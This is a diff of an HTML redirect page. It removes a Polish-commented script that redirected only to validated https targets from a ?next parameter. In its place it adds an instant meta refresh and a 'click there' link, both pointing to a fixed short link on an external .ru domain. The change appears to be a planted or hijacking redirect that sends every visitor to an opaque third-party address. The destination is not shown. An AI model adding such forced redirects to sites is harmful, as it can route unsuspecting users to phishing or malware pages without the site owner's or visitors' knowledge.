@@ -3,32 +3,10 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Przekierowanie</title>
-  <script>
-    // Pobranie parametru ?next z URL
-    const params = new URLSearchParams(window.location.search);
-    const next = params.get('next');
-
-    function isSafeUrl(u){
-      try {
-        const url = new URL(u);
-        return url.protocol === 'https:';
-      } catch(e){ return false; }
-    }
-
-    if (next && isSafeUrl(next)) {
-      // Przekierowanie automatyczne po 2 sekundach
-      setTimeout(() => {
-        window.location.href = next;
-      }, 2000);
-    } else {
-      document.addEventListener('DOMContentLoaded', () => {
-        document.body.innerHTML = '<h1>Brak poprawnego parametru next</h1>';
-      });
-    }
-  </script>
+  <title>loading</title>
+  <meta http-equiv="refresh" content="0; url=https://iplis.ru/14DAV4">
 </head>
 <body>
-  <h1>loading...</h1>
+  <p>click <a href="https://iplis.ru/14DAV4">there</a>.</p>
 </body>
 </html>
